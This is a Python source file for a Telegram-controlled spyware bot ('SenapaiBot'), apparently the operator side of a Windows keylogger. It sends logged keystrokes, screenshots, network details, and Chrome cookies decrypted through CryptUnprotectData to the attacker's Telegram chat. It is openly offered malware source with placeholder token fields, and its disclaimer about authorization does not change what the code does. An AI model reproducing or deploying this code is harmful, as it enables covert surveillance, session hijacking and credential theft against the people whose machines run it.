from typing import Final
import telegram
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import os
import tempfile
import glob
import socket
import subprocess
import sqlite3
import win32crypt


TEMP_DIR = tempfile.gettempdir()
# Define constants
Token: Final = "BOT_Token" #put your telegram bot token here
Bot_Username: Final = "@Senapai" # Use temp directory for logs

CHAT_ID = "CHAT_ID" # put telegram chat id here
SCREENSHOT_FILE_PATH = os.path.join(tempfile.gettempdir(), "latest_screenshot.png") # Path to the latest screenshot

# Create bot object
bot = telegram.Bot(token=Token)

def get_network_info():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)

        result = subprocess.run(["ipconfig"], capture_output=True, text=True)
        network_info = result.stdout

        return f"Hostname: {hostname}\nLocal IP: {local_ip}\n\nNetwork Info:\n{network_info}"

    except Exception as e:
        return f"An error occurred while fetching network info: {str(e)}"

def steal_chrome_cookies():
    cookies = []
    cookie_db_path = os.path.join(os.environ["LOCALAPPDATA"], r"Google\Chrome\User Data\Default\Cookies")

    try:
        conn = sqlite3.connect(cookie_db_path)
        cursor = conn.cursor()

        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")

        for host_key, name, encrypted_value in cursor.fetchall():
            try:
                # Decrypt the cookie using CryptUnprotectData
                decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
                cookies.append(f"Host: {host_key}, Name: {name}, Value: {decrypted_value.decode('utf-8')}")
            except Exception as e:
                cookies.append(f"Host: {host_key}, Name: {name}, Value: <Failed to Decrypt>")

        conn.close()

    except Exception as e:
        return f"Error accessing cookie database: {str(e)}"

    return "\n".join(cookies)

# Commands
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Thanks for using SenapaiBot, I am Senpai, your keystroke listener. How may I help you today?"
    )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Welcome to the Keylogger Bot!\n\n"
        "Here are the commands you can use:\n"
        "/help - Show this help message.\n"
        "/keystrokes - Retrieve all logged keystrokes (only available if you have the correct permissions).\n"
        "/screenshot - Get the latest screenshot captured by pressing F12.\n"
        "\nPlease use these commands responsibly and ensure you have authorization to access the information."
    )


async def keystrokes_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send the contents of the log file (keystrokes) to the user."""
    try:
        # Open and read the log file
        with open(LOG_FILE_PATH, 'r') as file:
            logs = file.read()

        # Check if there are any logs
        if logs:
            await update.message.reply_text(f"Here are the logged keystrokes:\n\n{logs}")
        else:
            await update.message.reply_text("No keystrokes have been logged yet.")

    except Exception as e:
        print(f"Error reading log file: {e}")
        await update.message.reply_text("An error occurred while trying to read the log file.")


def find_latest_screenshot():
    """Find the latest screenshot based on modification time."""
    # Search for all PNG files in the temp directory
    screenshot_files = glob.glob(os.path.join(TEMP_DIR, "*.png"))

    if not screenshot_files:
        return None  # No screenshots found

    # Find the most recently modified file
    latest_screenshot = max(screenshot_files, key=os.path.getmtime)
    return latest_screenshot


async def screenshot_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send the latest screenshot to the user."""
    try:
        # Find the latest screenshot file dynamically
        latest_screenshot = find_latest_screenshot()

        if latest_screenshot:
            print(f"Found latest screenshot: {latest_screenshot}")
            # Send the screenshot if it exists
            with open(latest_screenshot, 'rb') as photo:
                await context.bot.send_photo(chat_id=update.effective_chat.id, photo=photo)
            print("Screenshot sent successfully!")
        else:
            # No screenshot found
            print("No screenshot found.")
            await update.message.reply_text("No screenshot available. Please press F12 to capture a screenshot.")
    except Exception as e:
        print(f"Error sending screenshot: {e}")
        await update.message.reply_text("An error occurred while trying to send the screenshot.")

async def cookies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send the cookies to the user."""
    try:
        cookies = steal_chrome_cookies()
        if cookies:
            await update.message.reply_text(f"Here are the cookies:\n\n{cookies}")
        else:
            await update.message.reply_text("No cookies found.")
    except Exception as e:
        print(f"Error retrieving cookies: {e}")
        await update.message.reply_text("An error occurred while trying to retrieve cookies.")

async def networkinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send network information to the user."""
    try:
        # Get network information
        network_info = get_network_info()
        await update.message.reply_text(f"Network Information:\n\n{network_info}")
    except Exception as e:
        print(f"Error fetching network info: {e}")
        await update.message.reply_text("An error occurred while trying to fetch network information.")


async def custom_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("This is a custom command!\n")


# Responses
def handle_response(text: str) -> str:
    processed: str = text.lower()

    if "hello" in processed:
        return "Hey there!"

    if "how are you" in processed:
        return "I am good! WBU?"

    if "hey" in processed:
        return "Whatsup"

    return "I don't understand what you wrote."


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message_type: str = update.message.chat.type
    text: str = update.message.text

    print(f"User {update.message.chat.id} in {message_type}: '{text}'")

    if message_type == "group":
        if Bot_Username in text:
            new_text: str = text.replace(Bot_Username, "").strip()
            response: str = handle_response(new_text)
        else:
            return
    else:
        response: str = handle_response(text)

    print("Bot: ", response)
    await update.message.reply_text(response)


async def error(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"Update {update} caused error {context.error}")


if __name__ == "__main__":
    print("Starting Bot...")
    app = Application.builder().token(Token).build()

    # Commands
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("custom", custom_command))
    app.add_handler(CommandHandler("keystrokes", keystrokes_command))  # Correct function without parentheses
    app.add_handler(CommandHandler("screenshot", screenshot_command))  # New command for screenshots
    app.add_handler(CommandHandler("networkinfo", networkinfo_command))
    app.add_handler(CommandHandler("cookies", cookies_command))

    # Messages
    app.add_handler(MessageHandler(filters.TEXT, handle_message))

    # Errors
    app.add_error_handler(error)

    print("Polling...")
    app.run_polling(poll_interval=3)
